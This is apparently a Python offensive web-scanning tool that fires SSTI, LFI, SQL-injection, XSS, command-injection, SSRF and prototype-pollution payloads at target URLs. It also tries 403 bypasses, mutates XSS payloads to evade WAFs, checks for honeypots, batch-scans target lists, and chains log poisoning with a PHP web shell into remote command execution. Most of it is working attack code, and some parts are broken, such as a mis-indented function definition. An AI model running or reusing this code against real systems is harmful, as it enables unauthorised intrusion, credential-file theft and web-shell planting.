import aiohttp, asyncio, time, random, string, socket, re, websockets, json, hashlib, dns.resolver, base64, ipaddress, io
from urllib.parse import quote
import requests
from rich.console import Console
from bs4 import BeautifulSoup
import argparse
import sqlite3

console = Console()

HEADERS = {
    "User-Agent": random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0)",
    ]),
    "Referer": "https://target.com",
    "X-Forwarded-For": "1.1.1.1",
    "X-Real-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "Origin": "https://target.com"
}

bypass_headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

waf_signatures = {
    'cloudflare': ['cf-ray', '__cfduid'],
    'akamai': ['akamai'],
    'sucuri': ['sucuri'],
}

spoof_headers = {"Host": "evil.com"}

leak_paths = ["/api/admin", "/internal", "/.env", "/config.json"]

headers = {
    "X-Forwarded-Host": "evil.com",
    "X-Host": "evil.com",
}

ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

asn_targets = [
    "15169",  # Google
    "13335",  # Cloudflare
    "16509",  # AWS
]

js_targets = ["/manifest.json", "/service-worker.js", "/static/js/app.js.map"]

fallbacks = ["/404.html", "/_redirects", "/fallback.html"]

def gen_headers():
    return {
        "User-Agent": random.choice(ua_list),
        "Referer": f"https://{random.randint(1,999)}.google.com",
        "Accept-Language": random.choice(["en-US", "id-ID", "ja-JP"]),
        "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
    }

async def fetch(session, url, headers, data):
    async with session.post(url, headers=headers, data=data) as response:
        return await response.text()

def mutate_payload(payload):
    noise = ''.join(random.choices('<!-- -->', k=2))
    payload = payload.replace("script", f"scr{noise}ipt")
    payload = payload.replace("<", random.choice(["<", "%3C"]))
    payload = payload.replace("alert", f"a{random.choice(['l', 'L'])}ert")
    return payload

class Payload:
    def __init__(self, text, score=0):
        self.text = text
        self.score = score

    def mutate(self):
        m = mutate_payload(self.text)
        if self.score < -3:
            return None
        return Payload(m, self.score)
def log_result(target, vuln_type, url, payload, status, delay, info):
    try:
        with sqlite3.connect("scanlog.db") as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS logs (
                target TEXT, vuln_type TEXT, url TEXT,
                payload TEXT, status INTEGER, delay REAL, info TEXT
            )''')
            c.execute("INSERT INTO logs VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (target, vuln_type, url, payload, status, delay, info))
            conn.commit()
    except Exception as e:
        console.print(f"[LOGGING ERROR] {e}", style="red")

def classify_response(status, body):
    if status in [200, 201, 202, 204]:
        return "EXECUTED"
    elif status in [400, 403, 404, 500]:
        return "BLOCKED"
    elif status in [502, 503, 504]:
        return "BACKEND_ERROR"
    else:
        return "UNKNOWN"

def modulate_headers(base_headers, fail_reason):
    if fail_reason == "BLOCKED":
        base_headers["X-Forwarded-For"] = "127.0.0.1"
        base_headers["X-Originating-IP"] = "127.0.0.1"
        base_headers["X-Real-IP"] = "127.0.0.1"
    return base_headers

def extract_active_params(html):
    soup = BeautifulSoup(html, "html.parser")
    params = []
    for form in soup.find_all("form"):
        for input_tag in form.find_all("input"):
            if "name" in input_tag.attrs:
                params.append(input_tag["name"])
    return params

def load_targets(file_path):
    with open(file_path, 'r') as file:
        targets = [line.strip() for line in file]
    return targets

async def batch_scan(targets, concurrency=5):
    sem = asyncio.Semaphore(concurrency)
    async def sem_task(target):
        async with sem:
            await full_auto(target)
    await asyncio.gather(*(sem_task(t) for t in targets))

async def repeater_mode(url, param="q"):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        while True:
            payload = input("[REPEATER] Payload >> ").strip()
            if not payload: break
            try:
                async with session.get(f"{url}?{param}={quote(payload)}") as r:
                    body = await r.text()
                    status = r.status
                    tag = classify_response(status, body)
                    console.print(f"[PAYLOAD] {payload} → Status: {status} → {tag}", style="cyan")
            except Exception as e:
                console.print(f"[ERROR] {e}", style="red")
               async def full_auto(target):
    await adaptive_logic(target)
    await test_redos(target)
    await dom_sink_scanner(target)
    await blind_ssrf_test(target)
    await trigger_dns_canary(target)
    await websocket_fuzz("wss://target.com/socket")

def save_result(data):
    with open("lastscan.tmp", "w") as f:
        json.dump(data, f)

def load_last():
    with open("lastscan.tmp") as f:
        return json.load(f)

def save_json_report(results, file="report.json"):
    with open(file, "w") as f:
        json.dump(results, f, indent=2)
    console.print(f"[SAVE] Exploit report written to {file}", style="green")

def summarize_report(results):
    tags = []
    if results.get('lfi'): tags.append("🗂️ LFI")
    if results.get('xss'): tags.append("💉 XSS")
    if results.get('waf_bypass'): tags.append("🛡️ Bypass")
    if results.get('cloudflare'): tags.append("☁️ Cloudflare Cloaked")
    if results.get('open_redirect'): tags.append("🔁 Redirect Leak")

    console.print("\n".join([
        "╭─[Summary Report]",
        f"├─ Target: {results.get('target')}",
        f"├─ Score: {results.get('score', 0)}/10",
        f"├─ LFI: {'Detected' if results.get('lfi') else 'Not Detected'}",
        f"├─ XSS: {'Detected' if results.get('xss') else 'Not Detected'}",
        f"├─ SQLi: {'Detected' if results.get('sql') else 'Not Detected'}",
        f"├─ WAF Bypass: {'Detected' if results.get('waf_bypass') else 'Not Detected'}",
        f"├─ Cloudflare: {'Detected' if results.get('cloudflare') else 'Not Detected'}",
        f"├─ Open Redirect: {'Detected' if results.get('open_redirect') else 'Not Detected'}",
        f"╰─ Tags : {' | '.join(tags)}"
    ]), style="bold green")

redos_payloads = [
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX",
    "((a+)+)+b",
    "((a|a)+)+b",
    "a" * 10000 + "X"
]

async def test_redos(url, param="q"):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        for p in redos_payloads:
            try:
                t1 = time.time()
                async with session.get(f"{url}?{param}={quote(p)}") as r:
                    t2 = time.time()
                    if t2 - t1 > 4:
                        console.print(f"[💣 ReDoS Detected] Payload caused delay > {int(t2 - t1)}s", style="red")
            except: pass

async def dom_sink_scanner(url):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        try:
            async with session.get(url) as r:
                html = await r.text()
                soup = BeautifulSoup(html, "html.parser")
                scripts = soup.find_all("script")
                for s in scripts:
                    if s.string:
                        if any(x in s.string for x in ["eval(", "innerHTML", "document.write", "new Function"]):
                            console.print(f"[⚠️ DOM SINK] Found dangerous JS in <script>: {s.string[:60]}...", style="yellow")
        except: pass

ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
]

async def blind_ssrf_test(base_url, param="url"):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        for target_url in ssrf_targets:
            url = f"{base_url}?{param}={quote(target_url)}"
            try:
                async with session.get(url) as r:
                    if r.status == 200 and "instance" in await r.text():
                        console.print(f"[📡 BLIND SSRF] Triggered → {target_url}", style="red")
            except: pass

canary = f"ssrf-{random.randint(1000,9999)}.yourdomain.dnslog.cn"

async def trigger_dns_canary(url, param="url"):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        u = f"{url}?{param}=http://{canary}"
        try:
            await session.get(u)
            console.print(f"[🛰️ DNS Canary Sent] Payload → {canary}", style="cyan")
        except: pass
        
async def websocket_fuzz(ws_url):
    payloads = ['{"op":"ping"}', '\x00\xff', '{"msg":"<script>alert(1)</script>"}']
    try:
        async with websockets.connect(ws_url) as ws:
            for p in payloads:
                await ws.send(p)
                r = await ws.recv()
                console.print(f"[WS] Sent: {p} | Response: {r}", style="blue")
    except Exception as e:
        console.print(f"[ERROR] WebSocket failed → {ws_url} | {e}", style="red")

async def fire_exploit(session, target):
    ssti_payloads = ['{{7*7}}', '${{7*7}}', '<%= 7*7 %>', '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}']
    lfi_payloads = ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php']
    sqli_payloads = ["' OR SLEEP(5)-- -", "' AND 1=IF(1=1,SLEEP(5),0)-- -"]
    xss_payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']
    rce_payloads = ['; echo "RCE"; #', '; cat /etc/passwd; #']
    command_injection_payloads = ['; ls -la; #', '; whoami; #']

    for p in ssti_payloads:
        async with session.get(f"{target}?q={quote(p)}") as r:
            if "49" in await r.text():
                console.print(f"[EXPLOIT]  SSTI Detected at /?q={quote(p)}", style="bold red")

    for p in lfi_payloads:
        async with session.get(f"{target}?file={quote(p)}") as r:
            text = await r.text()
            if "root:x:" in text or "PD9waHAg" in text:
                console.print(f"[EXPLOIT]  LFI Detected → /etc/passwd exposed ✅", style="bold red")

    for p in sqli_payloads:
        t1 = time.time()
        async with session.get(f"{target}?id={quote(p)}") as r:
            delta = time.time() - t1
            if delta > 5:
                console.print(f"[EXPLOIT]  SQLi Confirmed via response delay + backend error", style="bold red")

    for p in xss_payloads:
        async with session.get(f"{target}?input={quote(p)}") as r:
            if p in await r.text():
                console.print(f"[EXPLOIT]  Reflected XSS → Executable on /search?q=", style="bold red")

    for p in rce_payloads:
        async with session.get(f"{target}?cmd={quote(p)}") as r:
            if "RCE" in await r.text():
                console.print(f"[EXPLOIT]  RCE Detected → Command executed ✅", style="bold red")

    for p in command_injection_payloads:
        async with session.get(f"{target}?cmd={quote(p)}") as r:
            if "ls -la" in await r.text() or "whoami" in await r.text():
                console.print(f"[EXPLOIT]  Command Injection Detected → Command executed ✅", style="bold red")

def build_path_variants(base):
    variants = [base, base.replace("admin", "ad%6din"), base.replace("/", "//"), "/./".join(base.split("/"))]
    return list(set(variants))

async def find_real_ip(domain):
    console.print(f"[RECON]  Bruteforcing IP for {domain}", style="green")
    common_ip = ['104.21.1.1', '172.67.1.1']
    async with aiohttp.ClientSession() as session:
        for ip in common_ip:
            try:
                async with session.get(f"http://{ip}", headers={"Host": domain}) as r:
                    if r.status == 200 and domain in await r.text():
                        console.print(f"[RECON]  Real IP: {ip} (leaked via internal.redirect.com)", style="green")
            except: pass

async def bruteforce_paths(target):
    paths = ['admin', 'api', 'dashboard', 'cpanel', 'upload', 'backup', '.git', '.env', 'config']
    async with aiohttp.ClientSession() as session:
        for p in paths:
            full = f"{target}/{p}"
            try:
                async with session.get(full) as r:
                    text = await r.text()
                    if r.status == 200 and not any(k in text.lower() for k in ['not found', 'error', 'forbidden']):
                        console.print(f"[RECON]  Found path: {full} - Status: {r.status}", style="green")
            except: pass

async def recursive_ssrf(target):
    ssrf_payloads = [
        'http://127.0.0.1', 'http://localhost', 'http://169.254.169.254',
        'http://127.0.0.1:8000', 'http://internal-api', 'http://metadata.google.internal'
    ]
    async with aiohttp.ClientSession() as session:
        for p in ssrf_payloads:
            u = f"{target}?url={quote(p)}"
            try:
                async with session.get(u) as r:
                    if "EC2" in await r.text() or r.status in [200, 302]:
                        console.print(f"[SSRF?]  {u}", style="cyan")
            except: pass

async def extract_js_endpoints(target):
    async with aiohttp.ClientSession() as session:
        async with session.get(target) as r:
            text = await r.text()
            js_urls = re.findall(r'src=["\'](.*?\.js)["\']', text)
            for js in js_urls:
                if not js.startswith('http'): js = f"{target}/{js.lstrip('/')}"
                try:
                    async with session.get(js) as jr:
                        body = await jr.text()
                        found = re.findall(r'(\/[a-zA-Z0-9_\-\/\.]+)', body)
                        for f in set(found):
                            if f.count('/') > 1 and not f.endswith('.js'):
                                console.print(f"[JS-HINT]  {f}", style="cyan")
                except: pass

async def passive_dns_recon(domain):
    subnames = ['www', 'mail', 'cpanel', 'admin', 'api', 'dev', 'internal']
    for s in subnames:
        full = f"{s}.{domain}"
        try:
            ip = socket.gethostbyname(full)
            console.print(f"[RECON]  Found Subdomain: {full} → {ip}", style="green")
        except: pass

async def analyze_waf_delay(target):
    total = 0
    async with aiohttp.ClientSession() as session:
        for _ in range(3):
            t0 = time.time()
            try:
                await session.get(target)
            except: pass
            total += time.time() - t0
    avg = total / 3
    if avg > 3:
        console.print(f"[WARNING]  Slow response — server delay: {avg * 1000:.0f}ms (rate-limiting?)", style="yellow")

async def build_notfound_signature(target):
    dummy = f"{target}/fake404_{random.randint(1000,9999)}"
    async with aiohttp.ClientSession() as session:
        async with session.get(dummy) as r:
            body = await r.text()
            return body[:64]

async def anti_honeypot_check(target):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{target}/admin") as r:
                txt = await r.text()
                if "honeypot" in txt.lower() or len(txt) < 10:
                    console.print(f"[WARNING]  Suspicious response at /admin", style="yellow")
    except: pass

async def bypass_403(target):
    payloads = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]
    async with aiohttp.ClientSession() as session:
        for h in payloads:
            try:
                async with session.get(f"{target}/admin", headers=h) as r:
                    if r.status == 200:
                        console.print(f"[403 BYPASS]  Success with header: {list(h.keys())[0]}", style="green")
            except: pass

async def method_mutation_test(target):
    methods = ['OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH']
    async with aiohttp.ClientSession() as session:
        for m in methods:
            try:
                req = await session.request(m, f"{target}/admin")
                r = await req
                if r.status in [200, 202, 405]:
                    console.print(f"[METHOD DETECT]  {m} allowed - Status: {r.status}", style="green")
            except: pass

async def cors_csp_check(target):
    async with aiohttp.ClientSession() as session:
        async with session.get(target) as r:
            headers = r.headers
            if 'Access-Control-Allow-Origin' in headers and '*' in headers['Access-Control-Allow-Origin']:
                console.print("[CORS MISCONFIG]  Wildcard found", style="yellow")
            if 'Content-Security-Policy' in headers:
                csp = headers['Content-Security-Policy']
                if "unsafe-inline" in csp or "*" in csp:
                    console.print(f"[CSP WEAK]  {csp}", style="yellow")

proto_payloads = [
    '__proto__[admin]=true',
    'constructor.prototype.admin=true',
    '__proto__.toString=alert(1)',
]

async def proto_pollution(target):
    async with aiohttp.ClientSession() as session:
        for p in proto_payloads:
            async with session.get(f"{target}/api?{quote(p)}") as r:
                if "admin" in await r.text() or r.status == 500:
                    console.print(f"[POLLUTION]  Payload triggered: {p}", style="cyan")

async def open_redirect_check(target):
    redirs = ['redirect', 'url', 'next', 'continue', 'return', 'dest']
    async with aiohttp.ClientSession() as session:
        for param in redirs:
            test = f"{target}/?{param}=https://evil.com"
            try:
                async with session.get(test, allow_redirects=False) as r:
                    if 'evil.com' in r.headers.get('Location', ''):
                        console.print(f"[OPEN REDIRECT]  Param: {param}", style="cyan")
            except: pass

async def tech_fingerprint(target):
    async with aiohttp.ClientSession() as session:
        async with session.get(target) as r:
            body = await r.text()
            headers = r.headers
            if 'x-powered-by' in headers:
                console.print(f"[TECH]  Powered by: {headers['x-powered-by']}", style="green")
            if '__NEXT_DATA__' in body: console.print("[TECH]  Next.js Detected", style="green")
            if 'vue' in body.lower(): console.print("[TECH]  Vue Detected", style="green")
            if 'react' in body.lower(): console.print("[TECH]  React Detected", style="green")
            if 'wp-content' in body: console.print("[TECH]  WordPress", style="green")

async def auto_chain_lfi_rce(target, lfi_path):
    poison = '<?php system($_GET["cmd"]); ?>'
    async with aiohttp.ClientSession() as session:
        await session.get(f"{target}/?page={quote(poison)}")
        lfi_url = f"{target}/vuln.php?file={quote(lfi_path)}&cmd=id"
        async with session.get(lfi_url) as r:
            if 'uid=' in await r.text():
                console.print(f"[CHAIN-RCE]  Triggered at: {lfi_url}", style="bold red")

async def time_based_sql(target):
    payloads = [
        "' OR SLEEP(5)--", '" OR SLEEP(5)--', "'; WAITFOR DELAY '0:0:5'--",
    ]
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        for p in payloads:
            t0 = time.time()
            try:
                async with session.get(f"{target}/search?q={quote(p)}") as r:
                    delta = time.time() - t0
                    if delta > 4:
                        console.print(f"[TIME-INJECT]  Delay detected → {p}", style="cyan")
            except: pass

def detect_waf_signature(html):
    for waf, signs in waf_signatures.items():
        for sig in signs:
            if sig in html:
                return waf
    return "WAF_NOT_DETECTED"

def rate_payload(payload, reflected, executed):
    score = 0
    if executed:
        score += 10
    elif reflected:
        score += 5
    return score

def cloak_payload(payload):
    return payload  # Placeholder for obfuscation logic

async def blind_storage_probe(post_url, get_url, param, payload):
    async with aiohttp.ClientSession() as session:
        async with session.post(post_url, data={param: payload}) as r:
            if r.status == 200:
                async with session.get(get_url) as r2:
                    if payload in await r2.text():
                        console.print(f"[STORED XSS]  Payload stored and reflected: {payload}", style="bold red")

async def simulate_dom_injection(url, param, payload):
    async with aiohttp.ClientSession(headers=gen_headers()) as session:
        full_url = f"{url}?{param}={quote(payload)}"
        try:
            async with session.get(full_url) as r:
                if payload in await r.text():
                    console.print(f"[DOM-INJECT]  Payload reflected at {full_url}", style="cyan")
        except: pass

async def adaptive_logic(target):
    intel = {'waf': '', 'delay_avg': 0, 'subdomains': 0}
    results = {'target': target, 'score': 0, 'lfi': False, 'xss': False, 'waf_bypass': False, 'cloudflare': False, 'open_redirect': False}

    async with aiohttp.ClientSession(headers=gen_headers(), cookies=None) as session:
        await fire_exploit(session, target)
        await bypass_403(target)
        await cors_csp_check(target)
        await proto_pollution(target)
        await extract_js_endpoints(target)
        await open_redirect_check(target)
        await tech_fingerprint(target)
        await analyze_waf_delay(target)
        await anti_honeypot_check(target)
        await method_mutation_test(target)

        # Payload Mutation & Evolution
        base_payload = "<script>alert(1)</script>"
        payload_pool = [Payload(base_payload)]
        for gen in range(3):
            new_pool = []
            for payload in payload_pool:
                try:
                    async with session.get(f"{target}?input={quote(payload.text)}") as r:
                        body = await r.text()
                        status = r.status
                        r_class = classify_response(status, body)
                        if r_class == "EXECUTED":
                            payload.score += 10
                        elif r_class == "BLOCKED":
                            payload.score -= 5
                        elif r_class == "BACKEND_ERROR":
                            payload.score += 3
                        if payload.score >= 5:
                            new_pool.append(payload.mutate())
                            console.print(f"[XSS-MUTATE] {payload.text} → SCORE: {payload.score}", style="magenta")
                except: pass
            payload_pool += [p for p in new_pool if p]

        # Inject with discovered params (simulasi)
        async with session.get(target) as r:
            html = await r.text()
            params = extract_active_params(html)
            for param in params:
                await simulate_dom_injection(target, param, "<script>alert(1)</script>")

        results['score'] = score = sum([p.score for p in payload_pool if p])
        summarize_report(results)
        save_result(results)
        save_json_report(results)
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target URL")
    parser.add_argument("--mode", choices=["auto", "repeater", "batch"], default="auto")
    parser.add_argument("--cookie", help="Cookie for authenticated requests")
    parser.add_argument("--auth-token", help="Auth token for authenticated requests")
    parser.add_argument("--targets-file", help="File containing list of targets for batch scanning")
    parser.add_argument("--concurrency", type=int, default=5, help="Concurrency level for batch scanning")
    args = parser.parse_args()

    if args.cookie:
        HEADERS["Cookie"] = args.cookie
    if args.auth_token:
        HEADERS["Authorization"] = f"Bearer {args.auth_token}"

    if args.mode == "repeater":
        asyncio.run(repeater_mode(args.target))
    elif args.mode == "auto":
        asyncio.run(full_auto(args.target))
    elif args.mode == "batch":
        targets = load_targets(args.targets_file)
        asyncio.run(batch_scan(targets, args.concurrency))
